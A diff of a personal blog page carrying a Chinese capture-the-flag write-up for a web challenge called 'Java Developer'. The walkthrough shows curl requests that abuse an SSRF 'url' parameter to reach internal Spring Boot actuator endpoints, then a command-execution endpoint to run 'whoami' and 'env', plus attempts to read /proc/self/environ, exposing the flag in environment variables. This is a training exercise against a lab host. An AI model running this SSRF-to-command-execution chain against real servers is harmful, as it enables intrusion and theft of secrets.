@@ -6,41 +6,107 @@
   <link rel="stylesheet" href="/css/style.css">
   <script src="/js/main.js" defer></script>
   <link rel="stylesheet" href="/css/_custom.css">
+  <style>
+    /* 侧边栏样式保持 V5 的完美状态 */
+    .sidebar .post-list-container ul { list-style: none !important; padding: 0 !important; margin: 0 !important; }
+    .sidebar .post-list-container li { padding: 10px 15px !important; border-bottom: 1px solid rgba(255,255,255,0.1) !important; }
+    .sidebar .post-list-container a.post-title-link { 
+        text-decoration: none !important; 
+        color: #eee !important;
+        font-weight: bold !important;
+        font-size: 14px !important;
+        display: block !important;
+    }
+    .sidebar .post-list-container .post-date { font-size: 12px !important; color: #999 !important; margin-top: 4px !important; }
+    .sidebar .contact-section { display: block !important; margin: 20px 0 !important; }
+    
+    /* 折叠组件样式 (为了防止你以后想用 layout 里的样式，这里保留着) */
+    details.auto-collapse { margin-bottom: 15px; background: #fff; border-radius: 8px; overflow: hidden; border: 1px solid #eee; }
+    details.auto-collapse summary { cursor: pointer; padding: 15px; background: #f8f9fa; font-weight: bold; color: #333; list-style: none; position: relative; border-left: 5px solid #007bff; display: flex; align-items: center; }
+    details.auto-collapse summary:hover { background: #e9ecef; }
+    details.auto-collapse summary::-webkit-details-marker { display: none; }
+    details.auto-collapse summary::after { content: '➕'; margin-left: auto; font-size: 0.8em; opacity: 0.6; }
+    details.auto-collapse[open] summary::after { content: '➖'; }
+    .collapse-content { padding: 20px; background: #fff; border-top: 1px solid #eee; }
+  </style>
 <meta name="generator" content="Hexo 8.1.1"></head>
 <body>
 
-<div class="sidebar">
-    <img src="/images/avatar.jpg" class="avatar" alt="avatar">
-    <h1 class="site-title">白白毛毛</h1>
+<div class="container">
+    <div class="sidebar">
+        <div class="header-info">
+            <img src="/images/avatar.jpg" class="avatar" alt="avatar">
+            <h1 class="site-title">白白毛毛</h1>
+            <nav class="nav">
+                <a href="/">首页</a>
+                <a href="/archives">归档</a>
+            </nav>
+        </div>
 
-    <nav class="nav">
-        <a href="/">首页</a>
-        <a href="/archives">归档</a>
-    </nav>
+        <div class="contact-section">
+            <p class="contact-intro">If you want find me:</p>
+            <div class="contact-item"><img src="/images/qq.png" class="contact-icon" style="width:20px;"><span>729626523</span></div>
+            <div class="contact-item"><img src="/images/GitHub.png" class="contact-icon" style="width:20px;"><span>yu-star-cyrene</span></div>
+            <div class="contact-item"><img src="/images/email.jpg" class="contact-icon" style="width:20px;"><span>y19350026593@gmail.com</span></div>
+        </div>
 
+        <div class="post-list-container" style="flex: 1; overflow-y: auto; border-top: 1px solid rgba(255,255,255,0.1);">
+            <ul>
+            
+                <li>
+                    <a href="/2025/11/11/PS-%E6%84%9F%E8%A7%89%E5%8F%AF%E4%BB%A5%E5%81%9A%E4%B8%80%E4%B8%AA/" class="post-title-link">PS:感觉可以做一个</a>
+                    <div class="post-date">2025-11-25</div>
+                </li>
+            
+                <li>
+                    <a href="/2025/11/11/nssctf%E5%AD%A6%E4%B9%A0%E4%B8%AD/" class="post-title-link">nssctf学习中</a>
+                    <div class="post-date">2025-11-25</div>
+                </li>
+            
+                <li>
+                    <a href="/2025/11/16/ctfshow%E7%9A%84%E8%AF%95%E7%82%BC/" class="post-title-link">ctfshow的试炼</a>
+                    <div class="post-date">2025-11-25</div>
+                </li>
+            
+                <li>
+                    <a href="/2025/11/16/%E7%A5%9E%E7%A7%98%E5%B0%8F%E7%AC%94%E8%AE%B0/" class="post-title-link">神秘小笔记</a>
+                    <div class="post-date">2025-11-25</div>
+                </li>
+            
+                <li>
+                    <a href="/2025/11/11/buuctf%E4%B9%8B%E8%B7%AF/" class="post-title-link">buuctf之路</a>
+                    <div class="post-date">2025-11-25</div>
+                </li>
+            
+            </ul>
+        </div>
+    </div>
+
+    <div class="content-area">
+        <div class="content-wrapper">
+            
+<style>
+    .article-content img, .article-content iframe {
+        max-width: 100% !important;
+        height: auto !important;
+        display: block;
+        margin: 20px auto;
+        box-shadow: 0 2px 10px rgba(0,0,0,0.1);
+    }
+    pre, code {
+        white-space: pre-wrap !important; 
+        word-wrap: break-word !important;
+    }
+</style>
+
+<article class="post-article" style="padding: 30px; background: #fff; border-radius: 8px; box-shadow: 0 2px 15px rgba(0,0,0,0.05);">
+    <h1 class="post-title" style="font-size: 2.2em; margin-bottom: 15px; color: #333;">PS:感觉可以做一个</h1>
+    <div class="post-meta" style="color: #999; margin-bottom: 40px; border-bottom: 1px solid #eee; padding-bottom: 15px;">
+        📅 发布于: 2025-11-11 17:51
+    </div>
     
-<!-- ===== Custom Contact Section ===== -->
-<div class="contact-section">
-    <p class="contact-intro">If you want find me, please:</p>
-    <div class="contact-item">
-        <img src="/images/qq.png" alt="QQ" class="contact-icon">
-        <span>729626523</span>
-    </div>
-    <div class="contact-item">
-        <img src="/images/GitHub.png" alt="GitHub" class="contact-icon">
-        <span>yu-star-cyrene</span>
-    </div>
-    <div class="contact-item">
-        <img src="/images/email.jpg" alt="Gmail" class="contact-icon">
-        <span>y19350026593@gmail.com</span>
-    </div>
-</div>
-<!-- ===== End Custom Contact Section ===== -->
-<div id="post-list">
-        <article>
-    <h1>PS:感觉可以做一个</h1>
-    <p class="date">2025-11-11</p>
-    <div class="article-content"><style>
+    <div class="article-content" id="article-content">
+        <style>
 /* 恢复代码块为等宽字体，但字号与正文一致，避免视觉突变 */
 :root { --post-font-size: 1rem; }
 /* 内联代码和键盘输入样式：等宽、与正文同大小 */
@@ -76,114 +142,159 @@ pre, pre code, .highlight, .hljs {
 }
 </style>
 
-<p><img src="/images/QQ20251111-175359.png" alt="alt text"></p>
-<pre><code class="language-bash">在看之前，提醒，需要自己理解一下题目需要你干什么，虽然这是我之前做的，但一些知识点感觉还是很重要，所以就心血来潮写了。
-靶场web题：&quot;Java Developer&quot; (1)
-
-打开题目所给的靶机，只有这么一句话根本没有下文，一开始很难有思路的，用工具扫一下。
-
-开始扫描......
-http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/robots.txt
-
-看到这有个robots.txt，打开看一下
-User-agent: *
-Disallow: /backend/*
-Disallow: /actuator/*
-Allow: /front/spider
-
-text
-
-/backend/和/actuator/都被禁止了，说明这两个里面肯定有东西。
-/front/spider 又允许这个，或许这个可以是一个跳板。
-
-我们先测试一下：
-C:\Users\G1731&gt;curl http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/front/spider
-{&quot;timestamp&quot;:&quot;2025-11-11T09:59:53.995+0000&quot;,&quot;status&quot;:404,&quot;error&quot;:&quot;Not Found&quot;,&quot;message&quot;:&quot;No message available&quot;,&quot;path&quot;:&quot;/front/front/spider&quot;}
-我们访问的是/front/spider，可它的反馈确是/front/front/spider，这说明一开始所有访问都是在这个/front/下进行的，被固定住了。
-
-我们这次正确访问一下：
-
-bash
-C:\Users\G1731&gt;curl http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider
-尝试 &lt;a href=&quot;http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/front/spider?url=https://www.baidu.com&quot;&gt;点击此处
-它返回了一个链接，看不出什么意思，我们再访问：
-
-bash
-C:\Users\G1731&gt;curl &quot;http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=https://www.baidu.com&quot;
-&lt;!DOCTYPE html&gt;&lt;!--STATUS OK--&gt;&lt;html&gt; &lt;head&gt;&lt;meta http-equiv=content-type content=text/html;charset=utf-8&gt;...（百度首页HTML内容）...
-这叽里呱啦的一大堆，完全不懂意思，但我们只要知道一点，这个地址是百度，而它在url后面，说明我们就可以利用这个向服务器发出请求，并得到反馈。
-
-再扫一下端口，发现80是开放的，外网端口开放且能发出请求，那我们再试一试内网：
-
-bash
-C:\Users\G1731&gt;curl &quot;http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/&quot;
-{&quot;timestamp&quot;:&quot;2025-11-11T10:09:34.482+0000&quot;,&quot;status&quot;:500,&quot;error&quot;:&quot;Internal Server Error&quot;,&quot;message&quot;:&quot;HTTP请求失败，响应码: 404&quot;,&quot;path&quot;:&quot;/front/spider&quot;}
-
-C:\Users\G1731&gt;curl &quot;http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://127.0.0.1:8080/&quot;
-{&quot;timestamp&quot;:&quot;2025-11-11T10:09:35.337+0000&quot;,&quot;status&quot;:500,&quot;error&quot;:&quot;Internal Server Error&quot;,&quot;message&quot;:&quot;HTTP请求失败，响应码: 404&quot;,&quot;path&quot;:&quot;/front/spider&quot;}
-有请求说明，8080端口是开的，而且有内网。
-
-我们试一下用内网访问刚才几个禁止：
-
-bash
-C:\Users\G1731&gt;curl &quot;http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/actuator&quot;
-{&quot;_links&quot;:{&quot;self&quot;:{&quot;href&quot;:&quot;http://localhost:8080/actuator&quot;,&quot;templated&quot;:false},&quot;health&quot;:{&quot;href&quot;:&quot;http://localhost:8080/actuator/health&quot;,&quot;templated&quot;:false},&quot;health-path&quot;:{&quot;href&quot;:&quot;http://localhost:8080/actuator/health/{*path}&quot;,&quot;templated&quot;:true},&quot;info&quot;:{&quot;href&quot;:&quot;http://localhost:8080/actuator/info&quot;,&quot;templated&quot;:false},&quot;mappings&quot;:{&quot;href&quot;:&quot;http://localhost:8080/actuator/mappings&quot;,&quot;templated&quot;:false}}}
-
-C:\Users\G1731&gt;curl &quot;http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/backend&quot;
-Nice! You will definitely succeed.
-运气很好，一下子就肯定了我们的猜想，方向是对的，那之后呢，其实还是不知道具体要怎么去操作，去看了点csdn，https://blog.csdn.net/qq_43290288/article/details/106296283
-
-发现这个actuator很厉害，可以直接在控制台发现所有监控点的映射信息，那不就说明可以查看所有东西吗，https:///images/QQ20251111-181803.png
-
-bash
-C:\Users\G1731&gt;curl &quot;http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/actuator/mappings&quot;
-{&quot;contexts&quot;:{&quot;application&quot;:{&quot;mappings&quot;:{&quot;dispatcherServlets&quot;:{&quot;dispatcherServlet&quot;:[{&quot;handler&quot;:&quot;Actuator web endpoint &#39;health&#39;&quot;,&quot;predicate&quot;:&quot;{GET /actuator/health, produces [application/vnd.spring-boot.actuator.v3+json || application/vnd.spring-boot.actuator.v2+json || application/json]}&quot;,&quot;details&quot;:{&quot;handlerMethod&quot;:{&quot;className&quot;:&quot;org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler&quot;,&quot;name&quot;:&quot;handle&quot;,&quot;descriptor&quot;:&quot;(Ljavax/servlet/http/HttpServletRequest;Ljava/util/Map;)Ljava/lang/Object;&quot;},&quot;requestMappingConditions&quot;:{&quot;consumes&quot;:[],&quot;headers&quot;:[],&quot;methods&quot;:[&quot;GET&quot;],&quot;params&quot;:[],&quot;patterns&quot;:[&quot;/actuator/health&quot;],&quot;produces&quot;:[{&quot;mediaType&quot;:&quot;application/vnd.spring-boot.actuator.v3+json&quot;,&quot;negated&quot;:false},{&quot;mediaType&quot;:&quot;application/vnd.spring-boot.actuator.v2+json&quot;,&quot;negated&quot;:false},{&quot;mediaType&quot;:&quot;application/json&quot;,&quot;negated&quot;:false}]}}},...（完整的mappings响应）...
-什么都来了，但什么也看不懂，这个时候就要请ai老师帮帮忙了。
-
-从 mappings 响应中，我们找到了所有后端接口：
-
-🔥 BackendController 接口：
-/backend/file - 文件读取功能
-/backend/whoami - 命令执行功能
-/backend/env - 环境变量功能
-/backend - 基础接口（返回 &quot;Nice! You will definitely succeed.&quot;）
-
-一针见血，我们就用这几个端口测试一下：
-
-bash
-C:\Users\G1731&gt;curl &quot;http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/backend/file?filename=/flag&quot;
-离$FLAG很近了哦
-
-C:\Users\G1731&gt;curl &quot;http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/backend/file?filename=/proc/self/environ&quot;
-离$FLAG很近了哦
-
-C:\Users\G1731&gt;curl &quot;http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/backend/whoami?cmd=whoami&quot;
-root
-
-C:\Users\G1731&gt;curl &quot;http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/backend/whoami?cmd=env&quot;
-HOSTNAME=a31cee05bb1eJAVA_HOME=/usr/local/openjdk-8PWD=/HOME=/rootLANG=C.UTF-8FLAG=G0D{e03bef26-6922-4157-abed-8e979286cf98}SHLVL=1PATH=/usr/local/openjdk-8/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binJAVA_VERSION=8u342_=/usr/local/openjdk-8/bin/java
-Great！ G0D{e03bef26-6922-4157-abed-8e979286cf98} 一下子就拿到flag了。
-
-说实话，我一开始做的时候看了无数遍离$FLAG很近了哦就是找不到flag，还以为做不出来呢。
-
-咕咕嘎嘎！！！
-
-
-
----
-
-版权声明：本文由白白毛毛创作，转载请注明出处。
-</code></pre>
-</div>
-</article>
+<h1 id="”Java-Developer”-1"><a href="#”Java-Developer”-1" class="headerlink" title="#”Java Developer” (1)"></a>#”Java Developer” (1)</h1><p><img src="/images/QQ20251111-175359.png" alt="alt text"></p>
+<p>在看之前，提醒，需要自己理解一下题目需要你干什么，虽然这是我之前做的，但一些知识点感觉还是很重要，所以就心血来潮写了。<br>靶场web题：”Java Developer” (1)</p>
+<p>打开题目所给的靶机，只有这么一句话根本没有下文，一开始很难有思路的，用工具扫一下。</p>
+<blockquote>
+<p>开始扫描……<br><a target="_blank" rel="noopener" href="http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/robots.txt">http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/robots.txt</a></p>
+</blockquote>
+<p>看到这有个robots.txt，打开看一下</p>
+<blockquote>
+<p>User-agent: *<br>Disallow: &#x2F;backend&#x2F;*<br>Disallow: &#x2F;actuator&#x2F;*<br>Allow: &#x2F;front&#x2F;spider</p>
+</blockquote>
+<p>&#x2F;backend&#x2F;和&#x2F;actuator&#x2F;都被禁止了，说明这两个里面肯定有东西。<br>&#x2F;front&#x2F;spider 又允许这个，或许这个可以是一个跳板。</p>
+<blockquote>
+<p>我们先测试一下：<br>C:\Users\G1731&gt;curl <a target="_blank" rel="noopener" href="http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/front/spider">http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/front/spider</a><br>{“timestamp”:”2025-11-11T09:59:53.995+0000”,”status”:404,”error”:”Not Found”,”message”:”No message available”,”path”:”&#x2F;front&#x2F;front&#x2F;spider”}</p>
+</blockquote>
+<p>我们访问的是&#x2F;front&#x2F;spider，可它的反馈确是&#x2F;front&#x2F;front&#x2F;spider，这说明一开始所有访问都是在这个&#x2F;front&#x2F;下进行的，被固定住了。</p>
+<p>我们这次正确访问一下：</p>
+<blockquote>
+<p>bash<br>C:\Users\G1731&gt;curl <a target="_blank" rel="noopener" href="http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider">http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider</a><br>尝试 <a target="_blank" rel="noopener" href="http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/front/spider?url=https://www.baidu.com">点击此处</p>
+</blockquote>
+<p>它返回了一个链接，看不出什么意思，我们再访问：</p>
+<blockquote>
+<p>bash<br>C:\Users\G1731&gt;curl “http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=https://www.baidu.com&quot;</p>
+</blockquote>
+<!DOCTYPE html><!--STATUS OK--><html> <head><meta http-equiv=content-type content=text/html;charset=utf-8>...（百度首页HTML内容）...
+<p>这叽里呱啦的一大堆，完全不懂意思，但我们只要知道一点，这个地址是百度，而它在url后面，说明我们就可以利用这个向服务器发出请求，并得到反馈。</p>
+<p>再扫一下端口，发现80是开放的，外网端口开放且能发出请求，那我们再试一试内网：</p>
+<blockquote>
+<p>bash<br>C:\Users\G1731&gt;curl “http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/&quot;<br>{“timestamp”:”2025-11-11T10:09:34.482+0000”,”status”:500,”error”:”Internal Server Error”,”message”:”HTTP请求失败，响应码: 404”,”path”:”&#x2F;front&#x2F;spider”}</p>
+<p>C:\Users\G1731&gt;curl “http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://127.0.0.1:8080/&quot;<br>{“timestamp”:”2025-11-11T10:09:35.337+0000”,”status”:500,”error”:”Internal Server Error”,”message”:”HTTP请求失败，响应码: 404”,”path”:”&#x2F;front&#x2F;spider”}</p>
+</blockquote>
+<p>有请求说明，8080端口是开的，而且有内网。</p>
+<p>我们试一下用内网访问刚才几个禁止：</p>
+<blockquote>
+<p>bash<br>C:\Users\G1731&gt;curl “http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/actuator&quot;<br>{“_links”:{“self”:{“href”:”http://localhost:8080/actuator&quot;,&quot;templated&quot;:false},&quot;health&quot;:{&quot;href&quot;:&quot;http://localhost:8080/actuator/health&quot;,&quot;templated&quot;:false},&quot;health-path&quot;:{&quot;href&quot;:&quot;http://localhost:8080/actuator/health/{*path}”,”templated”:true},”info”:{“href”:”http://localhost:8080/actuator/info&quot;,&quot;templated&quot;:false},&quot;mappings&quot;:{&quot;href&quot;:&quot;http://localhost:8080/actuator/mappings&quot;,&quot;templated&quot;:false}}}</p>
+<p>C:\Users\G1731&gt;curl “http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/backend&quot;<br>Nice! You will definitely succeed.</p>
+</blockquote>
+<p>运气很好，一下子就肯定了我们的猜想，方向是对的，那之后呢，其实还是不知道具体要怎么去操作，去看了点csdn，</p>
+<blockquote>
+<p>https://blog.csdn.net/qq_43290288&#x2F;article&#x2F;details&#x2F;106296283</p>
+</blockquote>
+<p>发现这个actuator很厉害，可以直接在控制台发现所有监控点的映射信息，那不就说明可以查看所有东西吗</p>
+<p><img src="/images/QQ20251111-181803.png" alt="alt text"></p>
+<blockquote>
+<p>bash<br>C:\Users\G1731&gt;curl “<a target="_blank" rel="noopener" href="http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/actuator/mappings">http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/actuator/mappings</a>“<br>{“contexts”:{“application”:{“mappings”:{“dispatcherServlets”:{“dispatcherServlet”:[{“handler”:”Actuator web endpoint ‘health’”,”predicate”:”{GET &#x2F;actuator&#x2F;health, produces [application&#x2F;vnd.spring-boot.actuator.v3+json || application&#x2F;vnd.spring-boot.actuator.v2+json || application&#x2F;json]}”,”details”:{“handlerMethod”:{“className”:”org.springframework.boot.actuate.endpoint.web.servlet.AbstractWebMvcEndpointHandlerMapping.OperationHandler”,”name”:”handle”,”descriptor”:”(Ljavax&#x2F;servlet&#x2F;http&#x2F;HttpServletRequest;Ljava&#x2F;util&#x2F;Map;)Ljava&#x2F;lang&#x2F;Object;”},”requestMappingConditions”:{“consumes”:[],”headers”:[],”methods”:[“GET”],”params”:[],”patterns”:[“&#x2F;actuator&#x2F;health”],”produces”:[{“mediaType”:”application&#x2F;vnd.spring-boot.actuator.v3+json”,”negated”:false},{“mediaType”:”application&#x2F;vnd.spring-boot.actuator.v2+json”,”negated”:false},{“mediaType”:”application&#x2F;json”,”negated”:false}]}}},…（完整的mappings响应）…</p>
+</blockquote>
+<p>什么都来了，但什么也看不懂，这个时候就要请ai老师帮帮忙了。</p>
+<blockquote>
+<p>从 mappings 响应中，我们找到了所有后端接口：</p>
+<p>🔥 BackendController 接口：<br>&#x2F;backend&#x2F;file - 文件读取功能<br>&#x2F;backend&#x2F;whoami - 命令执行功能<br>&#x2F;backend&#x2F;env - 环境变量功能<br>&#x2F;backend - 基础接口（返回 “Nice! You will definitely succeed.”）</p>
+</blockquote>
+<p>一针见血，我们就用这几个端口测试一下：</p>
+<blockquote>
+<p>bash<br>C:\Users\G1731&gt;curl “<a target="_blank" rel="noopener" href="http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/backend/file?filename=/flag">http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/backend/file?filename=/flag</a>“<br>离$FLAG很近了哦</p>
+<p>C:\Users\G1731&gt;curl “<a target="_blank" rel="noopener" href="http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/backend/file?filename=/proc/self/environ">http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/backend/file?filename=/proc/self/environ</a>“<br>离$FLAG很近了哦</p>
+<p>C:\Users\G1731&gt;curl “<a target="_blank" rel="noopener" href="http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/backend/whoami?cmd=whoami">http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/backend/whoami?cmd=whoami</a>“<br>root</p>
+<p>C:\Users\G1731&gt;curl “<a target="_blank" rel="noopener" href="http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/backend/whoami?cmd=env">http://60d2fa9c-9af6-4984-b183-5836c25af37b.ctf.g0dsec.com/spider?url=http://localhost:8080/backend/whoami?cmd=env</a>“<br>HOSTNAME&#x3D;a31cee05bb1eJAVA_HOME&#x3D;&#x2F;usr&#x2F;local&#x2F;openjdk-8PWD&#x3D;&#x2F;HOME&#x3D;&#x2F;rootLANG&#x3D;C.UTF-8FLAG&#x3D;G0D{e03bef26-6922-4157-abed-8e979286cf98}SHLVL&#x3D;1PATH&#x3D;&#x2F;usr&#x2F;local&#x2F;openjdk-8&#x2F;bin:&#x2F;usr&#x2F;local&#x2F;sbin:&#x2F;usr&#x2F;local&#x2F;bin:&#x2F;usr&#x2F;sbin:&#x2F;usr&#x2F;bin:&#x2F;sbin:&#x2F;binJAVA_VERSION&#x3D;8u342_&#x3D;&#x2F;usr&#x2F;local&#x2F;openjdk-8&#x2F;bin&#x2F;java</p>
+</blockquote>
+<p>Great！ G0D{e03bef26-6922-4157-abed-8e979286cf98} 一下子就拿到flag了。</p>
+<p>说实话，我一开始做的时候看了无数遍离$FLAG很近了哦就是找不到flag，还以为做不出来呢。</p>
+<p>咕咕嘎嘎！！！</p>
+<hr>
+<p>版权声明：本文由白白毛毛创作，转载请注明出处。</p>
 
     </div>
-</div>
+</article>
 
-<div class="content-area">
-    <div class="content-wrapper">
-        <div id="post-content">
-            <p class="hint">点击左侧文章标题查看内容</p>
+<script>
+document.addEventListener("DOMContentLoaded", function() {
+    const contentDiv = document.getElementById('article-content');
+    if (!contentDiv) return;
+
+    const children = Array.from(contentDiv.children);
+    if (children.length === 0) return;
+
+    const newContainer = document.createDocumentFragment();
+    let currentDetails = null;
+    let currentContentDiv = null;
+
+    // === V5 核心判定逻辑 ===
+    const getHeaderInfo = (el) => {
+        const text = el.innerText.trim();
+        const tagName = el.tagName.toLowerCase();
+        
+        // 1. 如果是 H1-H6 标签（说明 Markdown 里写了 # 且加了空格，如 "# 1. 题目"）
+        // 我们认为这肯定是标题
+        if (['h1','h2','h3','h4','h5','h6'].includes(tagName)) {
+             // 只有当它是数字开头时才折叠，避免把 "小结" 这种副标题也折叠了
+             // 如果你想折叠所有 H 标签，可以去掉这个正则判断
+             if (/^\d+/.test(text) || text.startsWith('#')) {
+                 return { isHeader: true, text: text };
+             }
+             return { isHeader: true, text: text };
+        }
+
+        // 2. 如果是 P 或 DIV 标签（说明 Markdown 写法不规范，如 "####4.题目" 没加空格）
+        // 关键点：只有以 # 开头的才算！这能完美避开正文里的 "1.if(...)"
+        if ((tagName === 'p' || tagName === 'div') && text.startsWith('#')) {
+            // 必须包含数字，防止误伤普通强调文本
+            if (/^#+\s*\d+/.test(text)) {
+                const cleanText = text.replace(/^#+\s*/, ''); // 去掉 # 号
+                return { isHeader: true, text: cleanText };
+            }
+        }
+        
+        return { isHeader: false };
+    };
+
+    children.forEach(el => {
+        const info = getHeaderInfo(el);
+
+        if (info.isHeader) {
+            // 🛑 遇到新标题：打包上一个
+            if (currentDetails) {
+                currentDetails.appendChild(currentContentDiv);
+                newContainer.appendChild(currentDetails);
+            }
+
+            // 创建新折叠框
+            currentDetails = document.createElement('details');
+            currentDetails.className = 'auto-collapse';
+            
+            // 标题
+            const summary = document.createElement('summary');
+            summary.innerText = info.text;
+            currentDetails.appendChild(summary);
+
+            // 内容区
+            currentContentDiv = document.createElement('div');
+            currentContentDiv.className = 'collapse-content';
+        } else {
+            // 📄 正文内容（包括你的 1.if(...)）
+            if (currentContentDiv) {
+                currentContentDiv.appendChild(el);
+            } else {
+                newContainer.appendChild(el);
+            }
+        }
+    });
+
+    // 处理最后一个
+    if (currentDetails) {
+        currentDetails.appendChild(currentContentDiv);
+        newContainer.appendChild(currentDetails);
+    }
+
+    // 更新页面
+    if (newContainer.children.length > 0) {
+        contentDiv.innerHTML = '';
+        contentDiv.appendChild(newContainer);
+    }
+});
+</script>
+
         </div>
     </div>
 </div>
